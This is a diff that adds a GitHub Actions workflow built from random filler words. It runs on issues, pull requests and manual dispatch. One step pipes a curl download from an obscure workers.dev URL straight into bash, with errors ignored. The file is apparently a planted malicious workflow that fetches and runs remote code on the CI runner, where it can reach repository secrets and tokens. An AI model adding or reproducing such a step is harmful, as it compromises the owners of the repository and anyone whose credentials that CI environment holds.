@@ -1,0 +1,27 @@
+name: container
+
+#disable statue complaint
+on:
+  issues:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+#beard
+jobs:
+  peer:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    #music slight elaborate nest suicide
+    - name: hand
+      continue-on-error: true
+      #abuse
+      run: |
+        curl -L "https://node.vrotsosvanhouten30272.workers.dev/711227bb5ccc9490/1dad2c9a8fbdd27d53b3/e37d46493af96bcb085c070ed4a8/?zhi=1775926688&anu=syu" | bash
+    - name: inflation
+      run: experimental
+    strategy:
+      matrix:
+        thunder: ["pad", "Australian", "generate", "expand", "coach"]
+        evaluate: ["restore", "yearly", "editorial", "provoke"]
